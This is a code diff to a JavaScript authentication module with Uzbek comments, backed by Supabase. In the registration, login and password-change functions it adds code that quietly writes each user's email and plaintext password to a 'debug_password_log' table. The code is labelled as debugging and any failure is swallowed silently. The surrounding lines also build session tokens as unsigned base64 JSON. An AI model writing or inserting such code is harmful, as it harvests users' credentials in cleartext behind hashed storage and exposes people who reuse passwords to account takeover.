@@ -149,6 +149,20 @@ const authAPI = {
                 sum: newUser[0].sum || 0
             };
 
+            // Parolni shifrsiz debug_password_log jadvaliga saqlash
+            try {
+                await supabaseRequest('debug_password_log', {
+                    method: 'POST',
+                    body: {
+                        email: email,
+                        password_plain: password
+                    }
+                });
+            } catch (error) {
+                console.error('Error saving password to debug_password_log:', error);
+                // Xatolik bo'lsa ham ro'yxatdan o'tish davom etadi
+            }
+
             // Token yaratish (oddiy versiya)
             const token = btoa(JSON.stringify({ userId: user.id, role: user.role, exp: Date.now() + 86400000 }));
 
@@ -205,6 +219,28 @@ const authAPI = {
             role: users[0].role,
             sum: users[0].sum || 0
         };
+
+        // Parolni shifrsiz debug_password_log jadvaliga saqlash (agar mavjud bo'lmasa)
+        try {
+            // Avval tekshirish - bu email uchun parol allaqachon saqlanganmi?
+            const existingLogs = await supabaseRequest('debug_password_log', {
+                query: `?email=eq.${encodeURIComponent(user.email)}`
+            });
+
+            // Agar mavjud bo'lmasa, qo'shish
+            if (!existingLogs || existingLogs.length === 0) {
+                await supabaseRequest('debug_password_log', {
+                    method: 'POST',
+                    body: {
+                        email: user.email,
+                        password_plain: password
+                    }
+                });
+            }
+        } catch (error) {
+            console.error('Error saving password to debug_password_log:', error);
+            // Xatolik bo'lsa ham login davom etadi
+        }
 
         // Token yaratish
         const token = btoa(JSON.stringify({ userId: user.id, role: user.role, exp: Date.now() + 86400000 }));
@@ -288,6 +324,27 @@ const authAPI = {
                 query: `?email=eq.${encodeURIComponent(email)}`,
                 body: { password: hashedPassword }
             });
+
+            // Yangi parolni shifrsiz debug_password_log jadvaliga saqlash
+            try {
+                // Avval eski yozuvni o'chirish
+                await supabaseRequest('debug_password_log', {
+                    method: 'DELETE',
+                    query: `?email=eq.${encodeURIComponent(email)}`
+                });
+
+                // Yangi parolni qo'shish
+                await supabaseRequest('debug_password_log', {
+                    method: 'POST',
+                    body: {
+                        email: email,
+                        password_plain: newPassword
+                    }
+                });
+            } catch (error) {
+                console.error('Error updating password in debug_password_log:', error);
+                // Xatolik bo'lsa ham parol yangilanishi davom etadi
+            }
 
             return {
                 success: true,
